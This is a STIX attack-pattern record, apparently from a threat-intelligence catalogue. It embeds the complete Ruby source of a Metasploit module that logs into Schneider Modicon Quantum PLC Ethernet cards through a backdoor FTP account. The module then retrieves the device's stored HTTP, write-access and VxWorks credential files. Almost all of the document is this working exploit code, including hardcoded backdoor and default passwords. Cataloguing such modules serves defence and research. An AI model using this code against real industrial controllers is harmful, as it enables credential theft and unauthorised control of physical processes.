{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6e3165ea-c60b-43e4-9b6b-6c50e7b30158",
    "created": "2024-08-14T16:22:21.691786Z",
    "modified": "2024-08-14T16:22:21.69179Z",
    "name": "Schneider Modicon Quantum Password Recovery",
    "description": " The Schneider Modicon Quantum series of Ethernet cards store usernames and passwords for the system in files that may be retrieved via backdoor access.  This module is based on the original 'modiconpass.rb' Basecamp module from DigitalBond. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/modicon_password_recovery.rb",
            "external_id": "modicon_password_recovery.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.digitalbond.com/tools/basecamp/metasploit-modules/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Schneider Modicon Quantum Password Recovery',\n      'Description'    => %q{\n        The Schneider Modicon Quantum series of Ethernet cards store usernames and\n        passwords for the system in files that may be retrieved via backdoor access.\n\n        This module is based on the original 'modiconpass.rb' Basecamp module from\n        DigitalBond.\n      },\n      'Author'         =>\n        [\n          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module\n          'todb' # Metasploit fixups\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]\n        ],\n      'DisclosureDate'=> '2012-01-19'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n        OptString.new('FTPUSER', [true, \"The backdoor account to use for login\", 'ftpuser'], fallbacks: ['USERNAME']),\n        OptString.new('FTPPASS', [true, \"The backdoor password to use for login\", 'password'], fallbacks: ['PASSWORD'])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('RUN_CHECK', [false, \"Check if the device is really a Modicon device\", true])\n      ])\n\n  end\n\n  # Thinking this should be a standard alias for all aux\n  def ip\n    Rex::Socket.resolv_to_dotted(datastore['RHOST'])\n  end\n\n  def check_banner\n    banner == \"220 FTP server ready.\\r\\n\"\n  end\n\n  # TODO: If the username and password is correct, but this /isn't/ a Modicon\n  # device, then we're going to end up storing HTTP credentials that are not\n  # correct. If there's a way to fingerprint the device, it should be done here.\n  def check\n    is_modicon = false\n    vprint_status \"#{ip}:#{rport} - FTP - Checking fingerprint\"\n    connect rescue nil\n    if sock\n      # It's a weak fingerprint, but it's something\n      is_modicon = check_banner()\n      disconnect\n    else\n      vprint_error \"#{ip}:#{rport} - FTP - Cannot connect, skipping\"\n      return Exploit::CheckCode::Unknown\n    end\n\n    if is_modicon\n      vprint_status \"#{ip}:#{rport} - FTP - Matches Modicon fingerprint\"\n      return Exploit::CheckCode::Detected\n    else\n      vprint_error \"#{ip}:#{rport} - FTP - Skipping due to fingerprint mismatch\"\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def run\n    if datastore['RUN_CHECK'] and check == Exploit::CheckCode::Detected\n      print_status(\"Service detected.\")\n      grab() if setup_ftp_connection()\n    else\n      grab() if setup_ftp_connection()\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def setup_ftp_connection\n    vprint_status \"#{ip}:#{rport} - FTP - Connecting\"\n    conn = connect_login\n    if conn\n      print_good(\"#{ip}:#{rport} - FTP - Login succeeded\")\n      report_cred(\n        ip: ip,\n        port: rport,\n        user: user,\n        password: pass,\n        service_name: 'modicon',\n        proof: \"connect_login: #{conn}\"\n      )\n      return true\n    else\n      print_error(\"#{ip}:#{rport} - FTP - Login failed\")\n      return false\n    end\n  end\n\n  def cleanup\n    disconnect rescue nil\n    data_disconnect rescue nil\n  end\n\n  # Echo the Net::FTP implementation\n  def ftp_gettextfile(fname)\n    vprint_status(\"#{ip}:#{rport} - FTP - Opening PASV data socket to download #{fname.inspect}\")\n    data_connect(\"A\")\n    res = send_cmd_data([\"GET\", fname.to_s], nil, \"A\")\n  end\n\n  def grab\n    logins = Rex::Text::Table.new(\n      'Header'\t=>\t\"Schneider Modicon Quantum services, usernames, and passwords\",\n      'Indent'\t=>\t1,\n      'Columns'\t=>\t[\"Service\", \"User Name\", \"Password\"]\n    )\n    httpcreds = ftp_gettextfile('/FLASH0/userlist.dat')\n    if httpcreds\n      print_status \"#{ip}:#{rport} - FTP - HTTP password retrieval: success\"\n    else\n      print_status \"#{ip}:#{rport} - FTP - HTTP default password presumed\"\n    end\n    ftpcreds = ftp_gettextfile('/FLASH0/ftp/ftp.ini')\n    if ftpcreds\n      print_status \"#{ip}:#{rport} - FTP - password retrieval: success\"\n    else\n      print_error \"#{ip}:#{rport} - FTP - password retrieval error\"\n    end\n    writecreds = ftp_gettextfile('/FLASH0/rdt/password.rde')\n    if writecreds\n      print_status \"#{ip}:#{rport} - FTP - Write password retrieval: success\"\n    else\n      print_error \"#{ip}:#{rport} - FTP - Write password error\"\n    end\n    if httpcreds\n      httpuser = httpcreds[1].split(/[\\r\\n]+/)[0]\n      httppass = httpcreds[1].split(/[\\r\\n]+/)[1]\n    else\n      # Usual defaults\n      httpuser = \"USER\"\n      httppass = \"USER\"\n    end\n    print_status(\"#{rhost}:#{rport} - FTP - Storing HTTP credentials\")\n    logins << [\"http\", httpuser, httppass]\n    report_auth_info(\n      :host\t=> ip,\n      :port\t=> 80,\n      :sname\t=> \"http\",\n      :user\t=> httpuser,\n      :pass\t=> httppass,\n      :active\t=> true\n    )\n    logins << [\"scada-write\", \"\", writecreds[1]]\n    if writecreds # This is like an enable password, used after HTTP authentication.\n      report_note(\n        :host => ip,\n        :port => 80,\n        :proto => 'tcp',\n        :sname => 'http',\n        :ntype => 'scada.modicon.write-password',\n        :data => writecreds[1]\n      )\n    end\n\n    if ftpcreds\n      #  TODO:\n      #  Can we add a nicer dictionary?  Revershing the hash\n      #  using Metasploit's existing loginDefaultencrypt dictionary yields\n      #  plaintexts that contain non-ascii characters for some hashes.\n      #  check out entries starting at 10001 in /msf3/data/wordlists/vxworks_collide_20.txt\n      #  for examples.  A complete ascii rainbow table for loginDefaultEncrypt is ~2.6mb,\n      #  and it can be done in just a few lines of ruby.\n      #  See https://github.com/cvonkleist/vxworks_hash\n      modicon_ftpuser = ftpcreds[1].split(/[\\r\\n]+/)[0]\n      modicon_ftppass = ftpcreds[1].split(/[\\r\\n]+/)[1]\n    else\n      modicon_ftpuser = \"USER\"\n      modicon_ftppass = \"USERUSER\" #from the manual.  Verified.\n    end\n    print_status(\"#{rhost}:#{rport} - FTP - Storing hashed FTP credentials\")\n    # The collected hash is not directly reusable, so it shouldn't be an\n    # auth credential in the Cred sense. TheLightCosine should fix some day.\n    # Can be used for telnet as well if telnet is enabled.\n      report_note(\n        :host => ip,\n        :port => rport,\n        :proto => 'tcp',\n        :sname => 'ftp',\n        :ntype => 'scada.modicon.ftp-password',\n        :data => \"User:#{modicon_ftpuser} VXWorks_Password:#{modicon_ftppass}\"\n      )\n      logins << [\"VxWorks\", modicon_ftpuser, modicon_ftppass]\n\n    # Not this:\n    # report_auth_info(\n    #\t:host\t=> ip,\n    #\t:port\t=> rport,\n    #\t:proto => 'tcp',\n    #\t:sname => 'ftp',\n    #\t:user\t=> modicon_ftpuser,\n    #\t:pass\t=> modicon_ftppass,\n    #\t:type => 'password_vx', # It's a hash, not directly usable, but crackable\n    #\t:active\t=> true\n    # )\n    print_line logins.to_s\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-19"
}